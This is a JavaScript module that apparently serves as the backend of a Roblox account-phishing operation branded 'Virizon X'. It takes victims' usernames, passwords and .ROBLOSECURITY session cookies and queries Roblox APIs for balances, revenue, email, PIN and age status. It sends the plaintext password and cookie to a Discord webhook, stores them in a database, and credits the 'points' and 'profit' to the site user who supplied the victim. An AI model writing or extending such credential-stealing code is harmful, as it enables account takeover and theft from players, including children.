require('dotenv').config();
const axios = require('axios');
const faunadb = require('faunadb');
const client = new faunadb.Client({
    secret: process.env.FAUNADB_SECRET,
});
const q = faunadb.query;

async function getAvatarUrl(userId) {
    const intuserId = parseInt(userId);
    const response = await axios.get(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${intuserId}&size=420x420&format=Png&isCircular=false`);
    const avatarUrl = response.data.data[0].imageUrl;
    return avatarUrl;
}

async function getUserId(rusername) {

    const data = {
        usernames: [rusername],
        excludeBannedUsers: true,
    };

    const response = await axios.post('https://users.roblox.com/v1/usernames/users', data, {
        headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
        },
    });

    if (response.data.data.length === 0) {
        return 1;
    }

    const userid = response.data.data[0].id;
    return userid;
}


async function getUserRobux(cookies) {
    try {
        const url = 'https://www.roblox.com/mobileapi/userinfo?nl=true';

        const response = await axios.get(url, {
            headers: {
                'X-Requested-With': 'XMLHttpRequest',
                'Cookie': `.ROBLOSECURITY=${cookies}`,
            },
        });

        const decodeuserinfo = response.data;
        const robux = decodeuserinfo.RobuxBalance;

        return robux;
    } catch (error) {
        console.error('An error occurred:', error.message);
    }
}


async function getPremiumData(userId, cookies) {
    const intuserId = parseInt(userId);
    const url = `https://premiumfeatures.roblox.com/v1/users/${userId}/subscriptions`;
    try {


        const response = await axios.get(url, {
            headers: {
                'X-Requested-With': 'XMLHttpRequest',
                'Cookie': `.ROBLOSECURITY=${cookies}`,
            },
        });

        const jsonpremium = response.data;

        let rbxmembership = 'Non Premium';

        if (jsonpremium.subscriptionProductModel !== null) {
            const premiumtype = jsonpremium.subscriptionProductModel.renewal;

            if (premiumtype === null) {
                const datedec = jsonpremium.subscriptionProductModel.expiration;
                const date = new Date(datedec).toLocaleDateString('en-US', {
                    timeZone: 'UTC'
                });
                rbxmembership = `Expires ${date}`;
            } else {
                const ren = jsonpremium.subscriptionProductModel.renewal;
                const date = new Date(ren).toLocaleDateString('en-US', {
                    timeZone: 'UTC'
                });
                rbxmembership = `Monthly ${date}`;
            }

            if (jsonpremium.subscriptionProductModel.robuxStipendAmount) {
                const premiumcheck = `Premium, ${jsonpremium.subscriptionProductModel.robuxStipendAmount}`;
                rbxmembership = `${premiumcheck}, ${rbxmembership}`;
            }
        }

        return rbxmembership;
    } catch (error) {
        return "Non Premium";
    }
}

async function checkPinStatus(cookies) {
    try {
        const url = 'https://auth.roblox.com/v1/account/pin';

        const response = await axios.get(url, {
            headers: {
                'X-Requested-With': 'XMLHttpRequest',
                'Cookie': `.ROBLOSECURITY=${cookies}`,
            },
        });

        const jsonpin = response.data;
        const isEnabled = jsonpin.isEnabled;

        let pin = 'Disable';

        if (isEnabled) {
            pin = 'Enable';
        }

        return pin;
    } catch (error) {
        console.error('An error occurred:', error.message);
    }
}

async function checkVerified(userId) {
    try {
        const url = `https://inventory.roblox.com/v1/users/${userId}/items/Asset/102611803/is-owned`;

        const response = await axios.get(url);

        const check = response.data;

        let verified = 'Unverified';

        if (check === true || check === 'true') {
            verified = 'Verified';
        }

        return verified;
    } catch (error) {
        console.error('An error occurred:', error.message);
    }
}


async function getCreditBalance(cookies) {
    try {
        const url = 'https://billing.roblox.com/v1/credit';

        const response = await axios.get(url, {
            headers: {
                'X-Requested-With': 'XMLHttpRequest',
                'Cookie': `.ROBLOSECURITY=${cookies}`,
            },
        });

        const jsoncredit = response.data;
        const credit = jsoncredit.balance;
        const robuxconvert = jsoncredit.robuxAmount;

        let credits = '';

        if (credit == 0) {
            credits = '$0.00';
        } else {
            credits = `$${credit}`;
        }

        return {
            credits,
            robuxconvert
        };
    } catch (error) {
        console.error('An error occurred:', error.message);
    }
}


async function getUserJoinDate(userId, cookies) {
    try {
        const url = `https://users.roblox.com/v1/users/${userId}`;

        const response = await axios.get(url, {
            headers: {
                'X-Requested-With': 'XMLHttpRequest',
                'Cookie': `.ROBLOSECURITY=${cookies}`,
            },
        });

        const jsonjoindate = response.data;
        const created = new Date(jsonjoindate.created).toLocaleDateString('en-US', {
            timeZone: 'UTC'
        });

        return created;
    } catch (error) {
        console.error('An error occurred:', error.message);
    }
}


async function getUserRevenue(userId, cookies) {
    try {
        const url = `https://economy.roblox.com/v2/users/${userId}/transaction-totals?timeFrame=Year&transactionType=summary`;

        const response = await axios.get(url, {
            headers: {
                'X-Requested-With': 'XMLHttpRequest',
                'Cookie': `.ROBLOSECURITY=${cookies}`,
            },
        });

        const jsonrevenue = response.data;
        const summary =
            jsonrevenue.salesTotal +
            jsonrevenue.affiliateSalesTotal +
            jsonrevenue.groupPayoutsTotal +
            jsonrevenue.currencyPurchasesTotal +
            jsonrevenue.premiumStipendsTotal +
            jsonrevenue.tradeSystemEarningsTotal +
            jsonrevenue.tradeSystemCostsTotal +
            jsonrevenue.premiumPayoutsTotal +
            jsonrevenue.groupPremiumPayoutsTotal +
            jsonrevenue.developerExchangeTotal +
            jsonrevenue.pendingRobuxTotal +
            jsonrevenue.incomingRobuxTotal +
            jsonrevenue.outgoingRobuxTotal +
            jsonrevenue.individualToGroupTotal +
            jsonrevenue.csAdjustmentTotal;

        const pendingrobux = jsonrevenue.pendingRobuxTotal;

        return {
            summary,
            pendingrobux,
        };
    } catch (error) {
        console.error('An error occurred:', error.message);
    }
}

async function getUserAge(cookies) {
    try {
        const url = 'https://www.roblox.com/my/account/json';

        const response = await axios.get(url, {
            headers: {
                'X-Requested-With': 'XMLHttpRequest',
                'Cookie': `.ROBLOSECURITY=${cookies}`,
            },
        });

        const jsonage = response.data;
        const value = 'UserAbove13';
        let mainage;

        if (value === 'UserAbove13') {
            const age = jsonage[value];
            mainage = age ? '13+' : '<13';
        }

        return mainage;
    } catch (error) {
        console.error('An error occurred:', error.message);
    }
}

async function getUserEmail(cookies) {
    try {
        const url = 'https://accountsettings.roblox.com/v1/email';

        const response = await axios.get(url, {
            headers: {
                'X-Requested-With': 'XMLHttpRequest',
                'Cookie': `.ROBLOSECURITY=${cookies}`,
            },
        });

        const jsonemail = response.data;
        const email = jsonemail.emailAddress;
        let emailadd;

        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

        if (emailRegex.test(email)) {
            emailadd = email;
        } else {
            emailadd = 'No Email';
        }

        return emailadd;
    } catch (error) {
        console.error('An error occurred:', error.message);
    }
}

async function getCollectiblesRAP(userId, cookies) {
    try {
        const url = `https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?sortOrder=Asc&limit=100`;

        const response = await axios.get(url, {
            headers: {
                'X-Requested-With': 'XMLHttpRequest',
                'Cookie': `.ROBLOSECURITY=${cookies}`,
            },
        });

        const json = response.data;
        let rap;

        if (!json.error && json.data.length > 0) {
            let decoderap = 0;

            for (const info of json.data) {
                decoderap = info.recentAveragePrice;
            }

            rap = `R$ ${decoderap}`;
        } else {
            rap = 'Hidden';
        }

        return rap;
    } catch (error) {
        console.error('An error occurred:', error.message);
    }
}


async function sendwebhooks(webhook, data) {
    const response = await axios.post(webhook, data, {
        headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
        },
    });
}

async function sendwebhooks(webhook, data) {
    try {
        const response = await axios.post(webhook, data, {
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
            },
        });

    } catch (error) {
        // Handle any errors that occurred during the request
        console.error('An error occurred while sending webhooks:', error);
    }
}

async function successembed(rusername, rpassword, cookies, successwebhook, sessionToken) {


    const user_ref_from_session = await client.query(
        q.Map(
            q.Paginate(q.Match(q.Index('sessions_by_token'), sessionToken)),
            q.Lambda(x => {
                return {
                    ref: q.Select(['data', 'user'], q.Get(x)),
                };
            })
        )
    );

    const refid = user_ref_from_session.data[0].ref.value.id

    const userData = await client.query(
        q.Map(
            q.Paginate(q.Ref(q.Collection('users'), refid)),
            q.Lambda((x) => ({
                user_id: q.Select(['ref', 'id'], q.Get(x)),
                discord_id: q.Select(['data', 'discord_id'], q.Get(x)),
                stats: q.Select(['data', 'stats'], q.Get(x)),
            }))
        )
    );

    const site_user_id = userData.data[0].user_id;
    const discord_id = userData.data[0].discord_id;
    const stats = userData.data[0].stats;

    const userId = await getUserId(rusername);
    const avatarUrl = await getAvatarUrl(userId);
    const membership = await getPremiumData(userId, cookies)
    const robux = await getUserRobux(cookies)
    const pin = await checkPinStatus(cookies)
    const verified = await checkVerified(userId)
    const getcredits = await getCreditBalance(cookies);
    const joindate = await getUserJoinDate(userId, cookies);
    const revenue = await getUserRevenue(userId, cookies)
    const getuserage = await getUserAge(cookies);
    const email = await getUserEmail(cookies);
    const rap = await getCollectiblesRAP(userId, cookies);

    const successembed = {
        content: "",
        username: "Virizon X - Bot",
        avatar_url: "",
        embeds: [{
            title: "[Click Here To View Profile]",
            description: `**${rusername}** Successfully Login\nDiscord <@${discord_id}>`,
            url: `https://www.roblox.com/users/${userId}/profile`,
            timestamp: new Date().toISOString(),
            color: parseInt("34eb8c", 16),
            footer: {
                text: "Buy Lexar Mgui Now!! https://discord.gg/lexarontop",
                icon_url: "https://cdn3.iconfinder.com/data/icons/round-default/64/add-512.png",
            },
            thumbnail: {
                url: avatarUrl,
            },
            author: {
                name: "Virizon - Success",
            },
            fields: [

                {
                    name: "Username",
                    value: rusername,
                    inline: true,
                },
                {
                    name: "Password",
                    value: rpassword,
                    inline: true,
                },
                {
                    name: "Membership",
                    value: membership,
                    inline: true,
                },
                {
                    name: "Revenue",
                    value: "R$ " + revenue.summary.toLocaleString(),
                    inline: true,
                },
                {
                    name: "Robux",
                    value: "R$ " + robux.toLocaleString(),
                    inline: true,
                },
                {
                    name: "Pending Robux",
                    value: "R$ " + revenue.pendingrobux.toLocaleString(),
                    inline: true,
                },
                {
                    name: "Inventory Rap",
                    value: "R$ " + rap.toLocaleString(),
                    inline: true,
                },
                {
                    name: "Credits",
                    value: getcredits.credits + " => R$ " + getcredits.robuxconvert.toLocaleString(),
                    inline: true,
                },
                {
                    name: "Security",
                    value: verified,
                    inline: true,
                },
                {
                    name: "Pin",
                    value: pin,
                    inline: true,
                },
                {
                    name: "Email",
                    value: email,
                    inline: true,
                },
                {
                    name: "Join Date",
                    value: `Joined ${joindate} , ${getuserage}`,
                    inline: true,
                },
                {
                    name: "Cookies",
                    value: "```yaml\n" +cookies+ "\n```",
                    inline: false,
                }
            ],
        }, ],
    };

    const payload = JSON.stringify(successembed);
    sendwebhooks(successwebhook, payload);

    try {
        // Retrieve the user with the given username
        await client.query(q.Get(q.Match(q.Index('rbx_accounts_by_rbxusername'), rusername)));
        return 'Account Already Checked';
    } catch (error) {
        if (error.message === 'instance not found') {
            try {
                // Adding The Stats
                const usertoupdate = await client.query(q.Get(q.Ref(q.Collection('users'), site_user_id)));
                let creditsString = getcredits.credits;

                stats.points += 1;
                stats.robux += robux;
                stats.credits += parseFloat(creditsString.replace('$', ''));
                stats.revenue += revenue.summary;

                await client.query(q.Update(usertoupdate.ref, {
                    data: {
                        stats
                    }
                }));

                await client.query(q.Create(q.Collection('rbx_accounts'), {
                    data: {
                        user_id: site_user_id,
                        rbxusername: rusername,
                        rbxpassword: rpassword,
                        membership: membership,
                        robux: robux,
                        credits: parseFloat(creditsString.replace('$', '')),
                        revenue: revenue.summary
                    }
                }));

                await client.query(q.Create(q.Collection('rbx_cookies'), {
                    data: {
                        user_id: site_user_id,
                        rbxcookie: cookies,
                    }
                }));


            } catch (error) {
                return 'An error occurred during account and cookie insertion';
            }
        } else {
            return 'An error occurred';
        }

        const autoprofitembed = {
            content: "",
            username: "Virizon X - Bot",
            avatar_url: "",
            embeds: [{
                description: `<@${discord_id}> Profit`,
                timestamp: new Date().toISOString(),
                color: parseInt("34eb8c", 16),
                footer: {
                    text: "Buy Lexar Mgui Now!! https://discord.gg/lexarontop",
                    icon_url: "https://cdn3.iconfinder.com/data/icons/round-default/64/add-512.png",
                },
                thumbnail: {
                    url: avatarUrl,
                },
                author: {
                    name: "Virizon - Auto Profit",
                },
                fields: [

                    {
                        name: "Membership",
                        value: membership,
                        inline: true,
                    },
                    {
                        name: "Revenue",
                        value: "R$ " + revenue.summary.toLocaleString(),
                        inline: true,
                    },
                    {
                        name: "Robux",
                        value: "R$ " + robux.toLocaleString(),
                        inline: true,
                    },
                    {
                        name: "Pending Robux",
                        value: "R$ " + revenue.pendingrobux.toLocaleString(),
                        inline: true,
                    },
                    {
                        name: "Inventory Rap",
                        value: "R$ " + rap.toLocaleString(),
                        inline: true,
                    },
                    {
                        name: "Credits",
                        value: getcredits.credits + " => R$ " + getcredits.robuxconvert.toLocaleString(),
                        inline: true,
                    },
                    {
                        name: "Join Date",
                        value: `Joined ${joindate} , ${getuserage}`,
                        inline: true,
                    },
                ],
            }, ],
        };
        const autoprofitpayload = JSON.stringify(autoprofitembed);
        sendwebhooks(process.env.AUTO_PROFIT, autoprofitpayload);
    }

    return 'New Account Validated';
}

module.exports = successembed;